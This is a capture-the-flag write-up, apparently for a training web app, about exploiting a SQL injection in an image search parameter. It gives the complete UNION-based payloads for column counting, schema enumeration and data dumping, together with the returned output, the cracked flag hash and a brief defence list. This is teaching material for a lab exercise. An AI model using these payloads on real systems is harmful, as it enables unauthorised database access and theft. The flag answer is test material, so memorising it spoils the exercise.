# Images SQL injection vulnerability

https://owasp.org/www-community/attacks/SQL_Injection

https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/

https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/

## Description

We find and sql injection vulnerability in the member search
our input is directly passed to the query,
means we can add parameters to the WHERE clause
The query must be similar to this:

`$id = isset($_GET['id'])
=> SELECT * FROM list_images WHERE id = ${input}`

## Attack

### I - Find the number of column with ORDER BY
---

input = "-1 ORDER BY N"

with order by if the number of column is superior it will show and error 
so we go with N = 1 then 2 then 3, and here we get and error

http://${IP}/?page=searchimg&id=1+ORDER+BY+2&Submit=Submit#

ID: 1 ORDER BY 2 
Title: Nsa
Url : https://www.nsa.org/img.jpg

=> The number of column is 2

### II - Find the vulnerable column with UNION SELECT
---

input = "-1 UNION SELECT 1,2"

http://${IP}/?page=searchimg&id=1+union+select+1%2C2&Submit=Submit#

ID: -1 union select 1,2 
Title: 2
Url : 1

=> The second column is vulnarable

input = "-1 UNION SELECT 1,version()"

http://${IP}/?page=searchimg&id=1+union+select+1%2Cversion%28%29&Submit=Submit#

ID: 1 union select 1,version() 
Title: 5.5.44-0ubuntu0.12.04.1
Url : 1

input = "-1 UNION SELECT 1,database()"

ID: -1 UNION SELECT 1,database() 
Title: Member_images
Url : 1

### III - Find the table name and columns with GROUP_CONCAT() | INFORMATION_SCHEMA() | DATABES()
---

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()) 
Title: list_images
Url : 1

=> Table name = list_images

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE())"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE()) 
Title: id,url,title,comment
Url : 1

### IV - Extract data
---

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(id) FROM list_images)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(id) FROM list_images) 
Title: 1,2,3,4,5,6
Url : 1

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(url) FROM list_images)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(url) FROM list_images) 
Title: https://www.nsa.org/img.jpg ,https://www.42.fr/42.png,https://www.google.fr/google.png, https://www.obama.org/obama.jpg, borntosec.ddns.net/images.png, https://www.h4x0r3.0rg/tr0ll.png
Url : 1

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(title) FROM list_images)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(title) FROM list_images) 
Title: Nsa,42 !,Google,Obama,Hack me ?,tr00l
Url : 1

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(comment) FROM list_images)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(comment) FROM list_images) 
Title: An image about the NSA !,There is a number..,Google it !,Yes we can !,If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46,Because why not ?
Url : 1

### V - Result
---

=> If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

=> 1928e8083cf461a51303633093573c46 -> md5 -> albatroz -> Sh256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Defense
Option 1: Use of Prepared Statements (with Parameterized Queries)

Option 2: Use of Properly Constructed Stored Procedures

Option 3: Allow-list Input Validation

Option 4: Escaping All User Supplied Input